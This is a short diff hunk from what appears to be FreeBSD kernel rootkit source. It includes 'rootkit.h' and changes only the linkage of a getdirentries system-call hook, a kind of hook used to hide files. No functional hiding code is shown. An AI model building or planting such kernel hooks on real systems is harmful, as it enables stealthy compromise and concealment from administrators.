@@ -51,7 +51,7 @@ __FBSDID("$FreeBSD$");
 
 #include "rootkit.h"
 
-static int
+int
 sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 {
 	long base;
